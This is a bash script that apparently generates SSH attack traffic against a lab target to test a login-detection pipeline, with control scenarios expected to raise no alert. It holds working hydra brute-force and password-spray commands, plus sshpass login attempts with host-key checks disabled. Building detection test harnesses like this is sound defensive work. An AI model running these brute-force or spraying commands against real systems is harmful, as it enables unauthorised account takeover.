#!/usr/bin/env bash
# On-demand attack scenarios against the lab SSH target only.
#
#   attack bruteforce-fail      (A1) ~50 wrong passwords for admin
#   attack bruteforce-success   (A2) same, with the real password near the end
#   attack password-spray       (A3) one password against >= 5 usernames
#   attack normal-typo          (C1) one wrong then the right password (control)
#   attack slow-guess           (C2) one wrong guess every 30 s for 5 min (control)
#
# Uses `hydra -t 4`: more parallel SSH connections get dropped by sshd and show
# up as connection errors instead of the failed-login lines the pipeline needs.
set -euo pipefail

SSH_HOST="${SSH_HOST:-target-ssh}"
SSH_PORT="${SSH_PORT:-2222}"
SSH_ADMIN_USER="${SSH_ADMIN_USER:-admin}"
SSH_ADMIN_PASS="${SSH_ADMIN_PASS:-password123}"
SPRAY_PASSWORD="${SPRAY_PASSWORD:-Winter2026!}"

WORDLISTS="/opt/attacker/wordlists"

SSH_OPTS=(
  -p "$SSH_PORT"
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o PreferredAuthentications=password
  -o PubkeyAuthentication=no
  -o ConnectTimeout=10
  -o LogLevel=ERROR
)

ssh_try() {
  # One password attempt; `true` just makes a successful login exit cleanly.
  local user="$1" pass="$2"
  sshpass -p "$pass" ssh "${SSH_OPTS[@]}" "${user}@${SSH_HOST}" true \
    >/dev/null 2>&1 || true
}

hydra_ssh() {
  # Remaining args are passed straight to hydra before the target.
  hydra "$@" -t 4 "ssh://${SSH_HOST}:${SSH_PORT}"
}

scenario="${1:-}"
case "$scenario" in
  bruteforce-fail)       # A1
    echo "[attack] A1 bruteforce-fail: ~50 wrong passwords for ${SSH_ADMIN_USER}"
    hydra_ssh -l "$SSH_ADMIN_USER" -P "${WORDLISTS}/no_hit.txt"
    ;;

  bruteforce-success)    # A2
    echo "[attack] A2 bruteforce-success: wordlist with the real password at the end"
    hydra_ssh -l "$SSH_ADMIN_USER" -P "${WORDLISTS}/hit.txt"
    ;;

  password-spray)        # A3
    echo "[attack] A3 password-spray: '${SPRAY_PASSWORD}' against users.txt"
    hydra_ssh -L "${WORDLISTS}/users.txt" -p "$SPRAY_PASSWORD"
    ;;

  normal-typo)           # C1 control -> no alert
    echo "[attack] C1 normal-typo: one wrong password then the right one"
    ssh_try "$SSH_ADMIN_USER" "wrong-first-try"
    sleep 1
    ssh_try "$SSH_ADMIN_USER" "$SSH_ADMIN_PASS"
    ;;

  slow-guess)            # C2 control -> no alert (documented blind spot)
    echo "[attack] C2 slow-guess: one wrong guess every 30 s for 5 min"
    for i in $(seq 1 10); do
      echo "[attack]   guess ${i}/10"
      ssh_try "$SSH_ADMIN_USER" "slow-wrong-${i}"
      [ "$i" -lt 10 ] && sleep 30
    done
    ;;

  ""|-h|--help|help)
    echo "usage: attack {bruteforce-fail|bruteforce-success|password-spray|normal-typo|slow-guess}"
    [ -z "$scenario" ] && exit 1 || exit 0
    ;;

  *)
    echo "[attack] unknown scenario: ${scenario}" >&2
    echo "usage: attack {bruteforce-fail|bruteforce-success|password-spray|normal-typo|slow-guess}" >&2
    exit 1
    ;;
esac

echo "[attack] ${scenario} done"
